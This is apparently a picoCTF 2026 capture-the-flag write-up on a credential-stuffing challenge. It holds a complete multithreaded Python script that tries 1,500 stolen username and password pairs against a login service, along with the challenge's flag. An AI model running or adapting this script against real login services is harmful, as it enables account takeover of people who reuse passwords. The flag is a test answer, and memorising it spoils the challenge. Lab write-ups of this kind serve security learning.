---
layout: single
title: "Credential Stuffing"
categories: [CTF, web]
permalink: /ctf/picoctf-2026/Web/credential-stuffing/
---

## Description:
Credential stuffing is the automated injection of stolen username and password pairs ("credentials") in to website login forms, in order to fraudulently gain access to user accounts. <br>
Since many users will re-use the same password and username/email, when those credentials are exposed (by a database breach or phishing attack, for example) submitting those sets of stolen credentials into dozens or hundreds of other sites can allow an attacker to compromise those accounts too. Download the credentials dump here. <br>
There was a recent data breach at a famous department store, in which the login credentials of thousands of users were stolen and dumped online. You're hoping at least one person reused their credentials from the department store for an account at a local bank. Stuff those credentials and get the flag!


## Solution:
1. The credentials dump contains a pair of username and password separated by a semicolon (;) on each line and has 1500 lines. 
2. I wrote a Python script to connect to the service and try each combination. However, trying all 1500 sets of credentials takes more than 15 minutes (and each instance only lasts for 15 minutes), so I used multithreading to speed up the process. <br>
```
import concurrent.futures
import threading
from pwn import *

HOST = 'crystal-peak.picoctf.net'
PORT = 52440
FILENAME = 'creds-dump.txt'
MAX_WORKERS = 3

found_event = threading.Event()

def attempt_login(index, total, username, password):
    if found_event.is_set():
        return
    
    try:
        io = remote(HOST, PORT, level='error') 
        
        io.recvuntil(b'Username: ', timeout=2)
        io.sendline(username.encode())
        
        io.recvuntil(b'Password: ', timeout=2)
        io.sendline(password.encode())
        
        response = io.recvall(timeout=1)
        io.close()
        
        if b'Invalid' not in response and b'picoCTF' in response:
            found_event.set() 
            print(f"\nSUCCESS")
            print(f"User: {username}")
            print(f"Pass: {password}")
            print(f"Response:\n{response.decode().strip()}")
        else:
            print(f"[{index}/{total}] Tried: {username}:{password}")
            
    except Exception as e:
        print(f"[{index}/{total}] [!] Error: {username} ({e})")

def main():
    try:
        with open(FILENAME, 'r') as f:
            lines = f.readlines()
    except FileNotFoundError:
        print(f"File not found!")
        return

    creds = []
    for line in lines:
        if not line.strip(): 
            continue
        try:
            u, p = line.strip().split(';')
            creds.append((u, p))
        except ValueError:
            continue
            
    total = len(creds)

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for i, (username, password) in enumerate(creds, 1):
            futures.append(executor.submit(attempt_login, i, total, username, password))
            
        concurrent.futures.wait(futures)

if __name__ == '__main__':
    main()
```

## Flag:
picoCTF{d0nt_r3u5e_cr3d3nt1als_433b090c}